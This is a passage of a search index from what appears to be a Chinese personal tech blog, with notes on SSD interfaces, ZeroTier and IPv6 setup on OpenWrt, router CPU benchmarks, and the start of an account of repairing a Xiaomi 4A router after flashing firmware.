protocal\uff0c\u8fd9\u91cc\u8fd8\u4e0d\u662f\u5f88\u6e05\u695a\uff0c\u8fd9\u4e2a\u662f\u5c5e\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u91cc\u7684\u9a71\u52a8\u5417\uff1f</li> <li>\u673a\u68b0\u786c\u76d8\u91c7\u7528 SATA \u63a5\u53e3 +AHCI \u534f\u8bae\u3002</li> <li>\u65e9\u671f\u7684\u56fa\u6001\u4e3a\u4e86\u517c\u5bb9\u4e5f\u4f7f\u7528 SATA \u63a5\u53e3\uff0c\u56e0\u6b64\u4e5f\u4f7f\u7528 AHCI \u534f\u8bae\uff0c\u6700\u9ad8\u901f\u5ea6\u4e3a 600MB/s\uff08SATA3\uff09</li> <li>\u7531\u4e8e AHCI \u662f\u4e3a\u673a\u68b0\u786c\u76d8\u8bbe\u8ba1\u7684\u534f\u8bae\uff0c\u4e0d\u80fd\u5145\u5206\u53d1\u6325 SSD \u7684\u901f\u5ea6\u3002\u4e8e\u662f\u4e4b\u540e\u5f15\u5165\u4e86\u65b0\u7684\u534f\u8bae\u2014\u2014NVMe\uff0c\u540c\u65f6\u91c7\u7528\u4e86 PCIe \u6216\u8005 m.2 \u7684\u63a5\u53e3\uff0c\u53ef\u4ee5\u8fbe\u5230\u66f4\u9ad8\u7684\u901f\u5ea6\u3002\u5982 3500MB/s</li> </ol> </li> </ul>","tags":["\u6697\u5f71\u9a91\u58eb 2","m2 \u63a5\u53e3"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2021/09/17/2021-09-17-Openwrt%E6%8A%98%E8%85%BE/","title":"Openwrt \u6298\u817e","text":"<ul> <li>\u79fb\u52a8\u5bbd\u5e26\u5f00\u542f ipv6</li> <li>Openwrt \u5b89\u88c5 ZeroTier</li> <li>Openwrt \u914d\u7f6e ipv6</li> <li>CPU \u6027\u80fd\u6d4b\u8bd5</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2021/09/17/2021-09-17-Openwrt%E6%8A%98%E8%85%BE/#\u79fb\u52a8\u5bbd\u5e26\u5f00\u542f-ipv6","title":"\u79fb\u52a8\u5bbd\u5e26\u5f00\u542f ipv6","text":"<ol> <li>\u79fb\u52a8\u5149\u732b\u4f7f\u7528\u6865\u63a5\u6a21\u5f0f + \u8def\u7531\u5668\u4f7f\u7528\u62e8\u53f7\u4e0a\u7f51</li> <li> <p>\u79fb\u52a8\u5149\u732b\u5f00\u542f ipv6 \u6b65\u9aa4</p> <ol> <li>\u5220\u9664\u539f\u672c ipv4 \u7684 PPPoE</li> <li>\u534f\u8bae\u9009\u62e9 ipv4/ipv6\uff0c\u521b\u5efa\u65b0\u7684PPP\u8fde\u63a5</li> </ol> </li> </ol>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2021/09/17/2021-09-17-Openwrt%E6%8A%98%E8%85%BE/#openwrt-\u5b89\u88c5-zerotier","title":"Openwrt \u5b89\u88c5 ZeroTier","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2021/09/17/2021-09-17-Openwrt%E6%8A%98%E8%85%BE/#\u4f5c\u7528","title":"\u4f5c\u7528","text":"<ol> <li>\u5c06\u82e5\u5e72\u4e2a\u5b89\u88c5\u4e86 Zerotier \u7684\u8bbe\u5907\u6dfb\u52a0\u5230\u4e00\u4e2a\u5927\u5c40\u57df\u7f51\u4e2d\u4e92\u76f8\u8bbf\u95ee</li> <li>\u5728 Zerotier \u4e2d\u8bbe\u7f6e Route\uff0c\u4ece\u800c\u5b9e\u73b0\u8bbf\u95ee openwrt \u8bbe\u5907\u5c40\u57df\u7f51\u4e2d\u7684\u5176\u5b83\u8bbe\u5907</li> </ol>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2021/09/17/2021-09-17-Openwrt%E6%8A%98%E8%85%BE/#\u76f8\u5173\u6559\u7a0b","title":"\u76f8\u5173\u6559\u7a0b","text":"<ol> <li> <p>openwrt \u5b98\u65b9 19.07.3 \u56fa\u4ef6\u4f7f\u7528 zerotier \u7684\u914d\u7f6e\u8fc7\u7a0b - OPENWRT \u4e13\u7248 - \u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn)</p> </li> <li> <p>https://www.bilibili.com/video/BV1hT4y1E78k</p> </li> </ol>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2021/09/17/2021-09-17-Openwrt%E6%8A%98%E8%85%BE/#\u5177\u4f53\u8fc7\u7a0b","title":"\u5177\u4f53\u8fc7\u7a0b","text":"<ol> <li> <p>\u53bb ZeroTier \u6ce8\u518c\u4e00\u4e2a\u8d26\u53f7\uff0c\u5e76\u4e86\u89e3 ZeroTier \u7684\u4f7f\u7528</p> </li> <li> <p>\u5b89\u88c5 zerotier</p> <pre><code>opkg update\nopkg install zerotier\n</code></pre> <p>\u8fd9\u91cc\u4f1a\u4f9d\u8d56 kmod-tun \u7b49\u5185\u6838\u6a21\u5757\uff0c\u8fd9\u8981\u6c42\u5185\u6838\u7248\u672c\u5b8c\u5168\u4e00\u81f4\u624d\u80fd\u5b89\u88c5\u6210\u529f\u3002openwrt \u5f00\u53d1\u7248\u672c (snapshot) \u6bcf\u5929\u3001\u751a\u81f3\u51e0\u4e2a\u5c0f\u65f6\u5c31\u4f1a\u66f4\u65b0\uff0c\u56e0\u6b64\u5f88\u6709\u53ef\u80fd\u56e0\u4e3a\u6709\u4e86\u65b0\u7684\u66f4\u65b0\uff0c\u5bfc\u81f4 opkg \u4e0b\u8f7d\u7684 kmod-tun \u5185\u6838\u7248\u672c\u4e0d\u4e00\u81f4\u5bfc\u81f4\u62a5\u9519\u3002\u89e3\u51b3\u529e\u6cd5\u4e3a\u66f4\u65b0\u4e3a\u65b0\u7248\u7684\u5f00\u53d1\u7248\uff0c\u5e76\u5c3d\u5feb\u4e0b\u8f7d\u5b89\u88c5\u3002\u5bf9\u4e8e stable \u7248\u672c\uff0c\u5b98\u65b9\u6e90\u4fdd\u8bc1\u4e86\u4e00\u81f4\u6027\uff0c\u56e0\u6b64\u8fd9\u91cc\u4e0d\u4f1a\u51fa\u73b0\u95ee\u9898\u3002</p> </li> <li> <p>\u914d\u7f6e ZeroTier</p> </li> </ol> <pre><code>mkdir -p /etc/zerotier\nuci set zerotier.openwrt_network=zerotier\nuci add_list zerotier.openwrt_network.join='\u4f60\u7684\u7f51\u7edc ID'\nuci set zerotier.openwrt_network.enabled='1'\nuci set zerotier.openwrt_network.config_path='/etc/zerotier'\nuci commit zerotier\n</code></pre> <pre><code>uci set zerotier.global.enabled='1'\nuci delete zerotier.earth\nuci set zerotier.mynet=network\nuci set zerotier.mynet.id=&lt;network_id&gt;\nuci commit zerotier\n</code></pre> <ol> <li> <p>\u542f\u52a8 zerotier\uff08\u6b64\u65f6\u5df2\u7ecf\u53ef\u4ee5\u4ece ZeroTier Central \u4e2d\u770b\u5230\u8def\u7531\u5668\u8fde\u4e0a\u4e86\uff09</p> <pre><code>/etc/init.d/zerotier enable\n/etc/init.d/zerotier start\n</code></pre> </li> <li> <p>\u521b\u5efa\u63a5\u53e3</p> <p>web \u754c\u9762\uff0c\u7f51\u7edc -&gt; \u63a5\u53e3\uff0c\u6dfb\u52a0\u65b0\u63a5\u53e3  \u540d\u79f0 ZeroTier  \u534f\u8bae\u9009\u9759\u6001\u534f\u8bae\uff0cip \u8bbe\u7f6e\u4e3a ZeroTier Central \u4e2d\u7684 ip  \u63a5\u53e3\u9009 z \u5f00\u5934\u7684\u9002\u914d\u5668  \u521b\u5efa/\u5206\u914d\u9632\u706b\u5899\u533a\u57df\u9009\u62e9 lan  \u4fdd\u5b58&amp;\u5e94\u7528</p> </li> <li> <p>\u9632\u706b\u5899</p> <p>\u5168\u90e8\u8bbe\u7f6e\u6210 allow</p> <p></p> </li> <li> <p>ZeroTier Central \u914d\u7f6e\u8def\u7531\u8f6c\u53d1</p> <p>\u914d\u7f6e\u8fd9\u4e2a\u540e\uff0c\u5728\u5916\u7f51\u53ef\u4ee5\u901a\u8fc7\u5c40\u57df\u7f51 ip \u76f4\u63a5\u8bbf\u95ee\u4e0d\u5728 ZeroTier Central \u4e2d\u7684\u5176\u5b83\u5c40\u57df\u7f51\u8bbe\u5907\u3002\uff08\u8fc7\u7a0b\u5927\u81f4\u662f\uff1a\u5916\u7f51 -&gt; zerotier -&gt; \u5c40\u57df\u7f51\u4e00\u53f0\u8bbe\u5907 (\u4f4d\u4e8e ZeroTier \u4e2d) -&gt; \u5c40\u57df\u7f51\u5176\u5b83\u8bbe\u5907\uff09</p> <p>\u6ce8\u610f\uff1a\u522b\u5c06\u7b2c\u4e00\u884c\u7684\u5220\u4e86\uff0c\u5426\u5219\u5168\u90e8\u65e0\u6cd5\u8bbf\u95ee</p> <p>\u7f3a\u70b9\uff1a\u76ee\u524d\u53d1\u73b0\uff0c\u5f53\u4e24\u53f0\u7535\u8111\u4f4d\u4e8e\u540c\u4e00\u4e2a\u5c40\u57df\u7f51\uff0c\u60f3\u8981\u76f4\u63a5\u901a\u8fc7\u5c40\u57df\u7f51 ip \u8bbf\u95ee\u65f6\uff0c\u5373\u4f7f\u6ca1\u6709\u5f00\u542f zerotier \u8f6f\u4ef6\uff0c\u4e24\u53f0\u7535\u8111\u7684\u76f8\u4e92\u8bbf\u95ee\u901f\u5ea6\u4e5f\u4f1a\u4e25\u91cd\u53d7\u9650\uff08\u539f\u672c\u53ef\u4ee5\u8dd1\u5230 500M\uff0c\u76f4\u63a5\u964d\u4e3a 10M\uff09</p> <p>\u914d\u7f6e\u56fe\uff1a\u8bbf\u95ee 192.168.31.*\u4e2d\u7684\u8bbe\u5907\u65f6\uff0c\u4f1a\u901a\u8fc7 192.168.192.168(\u5b9e\u9645\u5c40\u57df\u7f51 ip \u4e3a\u8def\u7531\u5668) \u8bbf\u95ee</p> </li> </ol> <p></p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2021/09/17/2021-09-17-Openwrt%E6%8A%98%E8%85%BE/#openwrt-\u914d\u7f6e-ipv6","title":"Openwrt \u914d\u7f6e ipv6","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2021/09/17/2021-09-17-Openwrt%E6%8A%98%E8%85%BE/#\u8bf4\u660e","title":"\u8bf4\u660e","text":"<p>\u5b89\u88c5\u597d openwrt(21.02) \u540e\uff0c\u4f1a\u9ed8\u8ba4\u5f00\u542f\u5e76\u914d\u7f6e ipv6\uff0c\u7535\u8111\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee ipv6\u3002\u4f46\u662f\u8be5\u65b9\u5f0f\u53ea\u6709\u8def\u7531\u5668\u80fd\u5f97\u5230\u4e00\u4e2a\u516c\u7f51 ipv6 \u5730\u5740\uff0c\u8def\u7531\u5668\u5c40\u57df\u7f51\u5185\u8bbe\u5907\u53ea\u6709\u672c\u5730 ipv6 \u5730\u5740\u3002\u7c7b\u4f3c\u4e8e Openwrt \u5f00\u542f\u4e86\u4e00\u5c42 ipv6 \u7684 NAT\u3002\u800c\u4e3a\u4e86\u8ba9\u8fde\u4e0a\u8def\u7531\u5668\u7684\u6240\u6709\u8bbe\u5907\u83b7\u5f97\u516c\u7f51 ipv6 \u5730\u5740\uff0c\u9700\u8981\u8fdb\u884c\u4ee5\u4e0b\u8bbe\u7f6e</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2021/09/17/2021-09-17-Openwrt%E6%8A%98%E8%85%BE/#\u7406\u8bba","title":"\u7406\u8bba","text":"<p>https://www.bilibili.com/video/BV1Lb4y197wD</p> <p>https://www.bilibili.com/video/BV15K4y1W74Q</p> <ul> <li>RA(router advertisement)\uff1a\u8def\u7531\u5668\u901a\u544a\uff0c\u901a\u8fc7\u5e7f\u64ad\u8be5\u4fe1\u606f\uff0c\u7ed9\u8bbe\u5907\u5206\u914d ipv6 \u5730\u5740</li> <li>SLAAC(Stateless Address Autoconfiguration)\uff1a\u65e0\u72b6\u6001\u7684\u5730\u5740\u81ea\u52a8\u914d\u7f6e\u534f\u8bae\u3002\u4f7f\u7528 RA \u8fdb\u884c\u5730\u5740\u914d\u7f6e\uff0c\u7279\u70b9\u662f\u65e0\u72b6\u6001\u7684\u3002DHCPv6 \u5219\u662f\u6709\u72b6\u6001\u7684\u3002\u76ee\u524d\u4f1a\u6df7\u5408\u4f7f\u7528\u8fd9\u4e24\u4e2a\u534f\u8bae\u6765\u914d\u7f6e ipv6\u3002</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2021/09/17/2021-09-17-Openwrt%E6%8A%98%E8%85%BE/#\u914d\u7f6e","title":"\u914d\u7f6e","text":"<p>\u53ef\u4ee5\u901a\u8fc7 luci \u6765\u914d\u7f6e\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539/etc/config/dhcp \u6587\u4ef6\u6765\u914d\u7f6e</p> <p>\u4fee\u6539 dhcp \u6d89\u53ca ipv6 \u90e8\u5206\u4e3a\u4ee5\u4e0b\u914d\u7f6e\u5373\u53ef\uff08\u5176\u4e2d wan6 \u90e8\u5206\u53ef\u80fd\u9700\u8981\u81ea\u5df1\u6dfb\u52a0\uff09</p> <pre><code>config dhcp 'lan'\n        option interface 'lan'\n        option start '100'\n        option limit '150'\n        option leasetime '12h'\n        option dhcpv4 'server'\n        option ra 'relay'\n        option dhcpv6 'relay'\n        option ndp 'relay'\n        list ra_flags 'none'\n\nconfig dhcp 'wan'\n        option interface 'wan'\n        option ignore '1'\n\nconfig dhcp 'wan6'\n        option interface 'wan'\n        option ra 'relay'\n        option dhcpv6 'relay'\n        option ndp 'relay'\n        option master '1'\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2021/09/17/2021-09-17-Openwrt%E6%8A%98%E8%85%BE/#cpu-\u6027\u80fd\u6d4b\u8bd5","title":"CPU \u6027\u80fd\u6d4b\u8bd5","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2021/09/17/2021-09-17-Openwrt%E6%8A%98%E8%85%BE/#simple-md5","title":"simple md5","text":"<p>Router CPU performance - rm's homepage (romanrm.net)</p> <ul> <li>mt7621<ul> <li>mi4a: 20MB/s</li> </ul> </li> <li>a53<ul> <li>ax6s: 117.64MB/s</li> </ul> </li> <li>rk3399: 200MB/s</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2021/09/17/2021-09-17-Openwrt%E6%8A%98%E8%85%BE/#openssl","title":"openssl","text":"<p>[OpenWrt Wiki] OpenSSL benchmarks rk3399</p> <pre><code>version: 3.0.2\nbuilt on: Wed May 24 17:12:55 2023 UTC\noptions: bn(64,64)\ncompiler: gcc -fPIC -pthread -Wa,--noexecstack -Wall -Wa,--noexecstack -g -O2 -ffile-prefix-map=/build/openssl-7eq86f/openssl-3.0.2=. -flto=auto -ffat-lto-objects -flto=auto -ffat-lto-objects -fstack-protector-strong -Wformat -Werror=format-security -DOPENSSL_TLS_SECURITY_LEVEL=2 -DOPENSSL_USE_NODELETE -DOPENSSL_PIC -DOPENSSL_BUILDING_OPENSSL -DNDEBUG -Wdate-time -D_FORTIFY_SOURCE=2\nCPUINFO: OPENSSL_armcap=0xbf\nThe 'numbers' are in 1000s of bytes per second processed.\ntype             16 bytes     64 bytes    256 bytes   1024 bytes   8192 bytes  16384 bytes\nmd5              25117.29k    75388.93k   170339.41k   248440.15k   286692.69k   289434.28k\nsha1             32326.83k   115190.76k   344452.95k   685736.96k   955422.04k   986294.95k\nsha256           30650.33k   109581.03k   322119.25k   619945.64k   852036.27k   871251.97k\nsha512           16066.74k    64347.97k   126085.80k   200046.93k   241947.99k   245028.18k\ndes-cbc              0.00         0.00         0.00         0.00         0.00         0.00\ndes-ede3         14249.92k    14731.20k    14853.12k    14884.86k    14893.06k    14893.06k\naes-128-cbc     404753.72k   850053.44k  1183380.39k  1294449.32k  1352469.16k  1352548.35k\naes-192-cbc     368863.90k   780227.81k  1056115.03k  1146200.75k  1192258.22k  1190625.28k\naes-256-cbc     359750.67k   697077.50k   883295.91k   988094.81k  1022683.82k  1021962.92k\n                  sign    verify    sign/s verify/s\nrsa 2048 bits 0.004963s 0.000132s    201.5   7580.0\n                  sign    verify    sign/s verify/s\ndsa 2048 bits 0.001820s 0.001724s    549.3    580.1\nawk: not an option: -e\nawk: not an option: -e\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2021/09/17/2021-09-17-Openwrt%E6%8A%98%E8%85%BE/#coremark","title":"coremark","text":"<p>coremark \u662f\u4e00\u4e2a\u5e38\u7528\u7684\u6d4b\u8bd5 MCU \u6027\u80fd\u7684\u8dd1\u5206\u7a0b\u5e8f\u3002\u5728 openwrt \u4e0a\u5b89\u88c5\u4e86 gcc, make \u540e\uff0c\u53ef\u4ee5\u5728 openwrt \u4e0a\u7f16\u8bd1\u5e76\u8fd0\u884c\u3002 \u7f16\u8bd1\u65f6\u6ce8\u610f\uff1amake NO_LIBRT=1</p> <p>rk3399</p> <pre><code>2K performance run parameters for coremark.\nCoreMark Size    : 666\nTotal ticks      : 20173\nTotal time (secs): 20.173000\nIterations/Sec   : 9914.241808\nIterations       : 200000\nCompiler version : GCC11.3.0\nCompiler flags   : -O2 -DPERFORMANCE_RUN=1  -lrt\nMemory location  : Please put data memory location here\n                        (e.g. code in flash, data on heap etc)\nseedcrc          : 0xe9f5\n[0]crclist       : 0xe714\n[0]crcmatrix     : 0x1fd7\n[0]crcstate      : 0x8e3a\n[0]crcfinal      : 0x4983\nCorrect operation validated. See README.md for run and reporting rules.\nCoreMark 1.0 : 9914.241808 / GCC11.3.0 -O2 -DPERFORMANCE_RUN=1  -lrt / Heap\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2021/10/17/2021-10-17-%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%B7%E5%87%BA%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/","title":"\u8bb0\u4e00\u6b21\u8def\u7531\u5668\u5237\u51fa\u95ee\u9898\u4fee\u590d\u8fc7\u7a0b","text":"","tags":["openwrt","breed","flash \u5206\u533a","EEPROM"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2021/10/17/2021-10-17-%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%B7%E5%87%BA%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u524d\u8a00","title":"\u524d\u8a00","text":"<p>\u8d77\u56e0\u662f\u60f3\u5728 openwrt \u4e0a\u88c5\u4e0aopenclash\u63d2\u4ef6\uff0c\u4f46\u8def\u7531\u5668\u7a7a\u95f4\u4e0d\u591f\u4e86\uff08\u8def\u7531\u5668\u4e3a mi4a \u5343\u5146\u7248\uff0c\u6709\u4e00\u4e2a 16M \u7684 NOR flash\u3002\u901a\u8fc7\u5728\u7f16\u8bd1\u65f6\u8bbe\u7f6e\u5757\u5927\u5c0f\u4e3a 512KB\uff0c\u6210\u529f\u5b89\u88c5\u4e86<code>zerotier</code>,<code>wireguard</code>,<code>python</code>\u7b49\u8f6f\u4ef6\uff0c\u7f16\u8bd1\u7684\u955c\u50cf\u5927\u5c0f\u4e3a 13,894,754 B\uff09\uff0c\u56e0\u6b64\u53c2\u8003\u5b98\u65b9\u6559\u7a0b\uff1a[OpenWrt Wiki] Saving firmware space and RAM\uff0c\u5728\u7f16\u8bd1\u65f6\u5173\u95ed\u4e86\u4e00\u4e9b\u5185\u6838\u76f8\u5173\u7684\u9009\u9879\uff0c\u5e76\u5c06\u5757\u5927\u5c0f\u8bbe\u7f6e\u4e3a\u4e86 1MB\u3002\u6700\u540e\u6210\u529f\u751f\u6210\u955c\u50cf\uff0c\u5927\u5c0f\u4e3a 14,943,330 B\u3002</p> <p>\u53ef\u6ca1\u60f3\u5230\u5728\u66f4\u65b0\u7cfb\u7edf\u540e\u8def\u7531\u5668\u65e0\u6cd5\u6b63\u786e\u542f\u52a8\uff0c\u4e8e\u662f\u9700\u8981\u5148\u4f7f\u7528\u5c0f\u7c73\u5b98\u65b9\u5de5\u5177\u6062\u590d\uff0c\u7136\u540e\u518d\u91cd\u5237 openwrt \u7cfb\u7edf\u3002\u4f46\u8003\u8651\u5230\u4e4b\u540e\u5982\u679c\u8981\u591a\u6b21\u5c1d\u8bd5\u7684\u8bdd\uff0c\u6bcf\u6b21\u5931\u8d25\u90fd\u9700\u8981\u5148\u6062\u590d\u5b98\u65b9\u7cfb\u7edf\u7136\u540e\u91cd\u65b0\u5237\u6bd4\u8f83\u9ebb\u70e6\u3002\u4e8e\u662f\u8fd9\u4e00\u6b21\u91cd\u88c5\uff0c\u6211\u9009\u62e9\u4e86\u5237breed\u5f15\u5bfc\u7a0b\u5e8f\u3002\u8fd9\u6837\uff0c\u4e0b\u6b21\u5237\u5931\u8d25\u540e\u4fbf\u53ef\u4ee5\u901a\u8fc7 breed \u76f4\u63a5\u91cd\u5237\u56fa\u4ef6\u3002</p> <p>\u7136\u800c\uff0c\u4e0d\u77e5\u662f\u5426\u662f\u56e0\u4e3a\u64cd\u4f5c\u8fc7\u7a0b\u4e2d\u7684\u4e00\u4e2a\u5931\u8bef\uff0c\u6211\u4f7f\u7528 breed \u5237 openwrt \u4f1a\u5931\u8d25\uff0c\u8def\u7531\u5668\u4f1a\u65e0\u9650\u91cd\u542f\u3002\u5e76\u4e14\u5728\u5237\u56de\u5b98\u65b9\u56fa\u4ef6\u540e\uff0c\u751a\u81f3\u65e0\u6cd5\u4e0a\u7f51\u3002\u6700\u540e\uff0c\u6211\u4ece\u539f\u5382\u56fa\u4ef6\u76f4\u63a5\u5237\u56de\u4e86 openwrt\uff0c\u4f46\u662f\u5374\u53d1\u73b0 openwrt \u4e2d\u76845GHz \u7684\u65e0\u7ebf\u6700\u5927\u53d1\u5c04\u529f\u7387 (Maximum transmit power) \u5c45\u7136\u53d8\u4e3a\u4e86 1mW(3dBm)\uff0c\u8fd9\u5bfc\u81f4\u8def\u7531\u5668\u7684 5G \u4fe1\u53f7\u975e\u5e38\u5f31\uff0c\u5373\u4f7f\u662f 1m \u7684\u8ddd\u79bb\uff0c\u4fe1\u53f7\u4e5f\u5f88\u5f31\u3002\u4e8e\u662f\u6211\u5404\u79cd\u5c1d\u8bd5\u53bb\u4fee\u590d\u8fd9\u4e2a\u95ee\u9898\uff0c\u4ee5\u4e0b\u662f\u8bb0\u5f55\u7684\u8fc7\u7a0b\u3002</p>","tags":["openwrt","breed","flash \u5206\u533a","EEPROM"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2021/10/17/2021-10-17-%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%B7%E5%87%BA%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u8bf4\u660e","title":"\u8bf4\u660e","text":"<p>\u53ef\u80fd\u9700\u8981\u4e86\u89e3 mi4a \u7684\u5237\u673a\u8fc7\u7a0b\uff0c\u5b98\u65b9\u6551\u7816\u5de5\u5177</p>","tags":["openwrt","breed","flash \u5206\u533a","EEPROM"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2021/10/17/2021-10-17-%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%B7%E5%87%BA%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u8fc7\u7a0b","title":"\u8fc7\u7a0b","text":"","tags":["openwrt","breed","flash \u5206\u533a","EEPROM"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2021/10/17/2021-10-17-%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%B7%E5%87%BA%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u7b2c\u4e00\u6b21\u5c1d\u8bd5","title":"\u7b2c\u4e00\u6b21\u5c1d\u8bd5","text":"<p>\u5728\u67d0\u6b21\u8fd0\u884c<code>OpenWRTInvasion</code>\u811a\u672c\u65f6\uff0c\u5207\u6362\u4e86\u4e0b\u7f51\u7edc\uff0c\u5bfc\u81f4\u8be5\u6b21\u8fd0\u884c\u5931\u8d25\uff0c\u53ef\u80fd\u5bfc\u81f4\u4ece\u672c\u5730\u4e0b\u8f7d busybox-mipsel \u51fa\u9519\uff0c\u4ece\u800c\u5bfc\u81f4\u4e86\u540e\u6765\u7684\u9519\u8bef\u3002\u5728\u540e\u9762\u7684\u6bcf\u4e00\u6b21\u901a\u8fc7\u5b98\u65b9\u5de5\u5177\u91cd\u5237\u540e\uff0c\u521d\u59cb\u8bbe\u7f6e\u65f6\u7684\u81ea\u52a8\u68c0\u6d4b\u4e0a\u7f51\u73af\u5883\u65e0\u6cd5\u68c0\u6d4b\u6210\u529f\u3002\u5e76\u4e14\uff0c\u8def\u7531\u5668\u7f51\u7edc\u51fa\u73b0\u95ee\u9898\uff0c\u6d4b\u901f\u7ed3\u679c\u4e5f\u5f88\u4e0d\u6b63\u5e38\u3002\u5982\u56fe\u6240\u793a\u3002</p> <p></p> <p></p> <p>\u6b64\u65f6\u6211\u5728\u7f51\u4e0a\u4e5f\u641c\u7d22\u5230 EEPROM \u9519\u8bef\u53ef\u80fd\u5bfc\u81f4\u65e0\u7ebf\u7f51\u7edc\u7684\u95ee\u9898\u3002</p> <p>\u6ce8\u610f\uff1a\u70b9\u51fb EEPROM \u540e\uff0c\u6d4f\u89c8\u5668\u4f1a\u81ea\u52a8\u4e0b\u8f7d eeprom \u5907\u4efd\uff0c\u9ed8\u8ba4\u6587\u4ef6\u540d eeprom.bin\uff0c\u6587\u4ef6\u5927\u5c0f\u4e00\u822c 64K\uff0c\u8fd9\u4e2a\u6587\u4ef6\u4e2d\u4e00\u822c\u5305\u542b\u8def\u7531\u5668 MAC \u5730\u5740\u3001\u65e0\u7ebf\u6821\u51c6\u53c2\u6570\u7b49\u3002\u4e22\u5931\u8be5\u6587\u4ef6\uff0c\u65e0\u7ebf\u8def\u7531\u5668\u53ef\u80fd WAN \u56e0\u4e3a\u6ca1\u6709 MAC \u65e0\u6cd5\u4ece\u4e0a\u7ea7\u8def\u7531\u5668\u83b7\u53d6 IP\uff1b\u65e0\u7ebf\u8def\u7531\u5668\u6ca1\u6709\u65e0\u7ebf\u4fe1\u53f7\u6216\u4fe1\u53f7\u6781\u5f31\u3002\u7f16\u7a0b\u5668\u56fa\u4ef6\u5c31\u662f\u95ea\u5b58\u5168\u90e8\u5907\u4efd\uff0c\u76f8\u5f53\u4e8e\u7535\u8111\u786c\u76d8\u7684\u5168\u76d8\u955c\u50cf\u3002\u65e0\u7ebf\u8def\u7531\u5668\u5237\u673a\u4e2d\uff0cBreed \u8be6\u7ec6\u4f7f\u7528\u6559\u7a0b\uff0c\u4e00\u4e9b\u6ce8\u610f\u4e8b\u9879_\u5907\u4efd (sohu.com)</p> <p>\u5e78\u597d\u6211\u7b2c\u4e00\u6b21\u5237 breed \u65f6\uff0c\u5728 breed \u4e2d\u9009\u62e9\u4fdd\u5b58\u4e86 EEPROM \u4ee5\u53ca\u7f16\u7a0b\u5668\u56fa\u4ef6\u3002\u4e8e\u662f\u6211\u8fdb\u884c\u4e86\u4ee5\u4e0b\u64cd\u4f5c\uff1a</p> <ol> <li>\u4f7f\u7528 breed \u6062\u590d EEPROM \u540e\uff0c\u540c\u65f6\u5237\u5165 openwrt \u5b98\u65b9 21.02 \u7248\u672c initramfs-kernel.bin\uff0c\u7ed3\u679c\u6ca1\u6709\u65e0\u7ebf\u7f51\u7edc\u3002</li> <li>\u5728 openwrt \u4e2d\u66f4\u65b0\u4e3a\u5b98\u65b9 21.02 \u7248\u672c 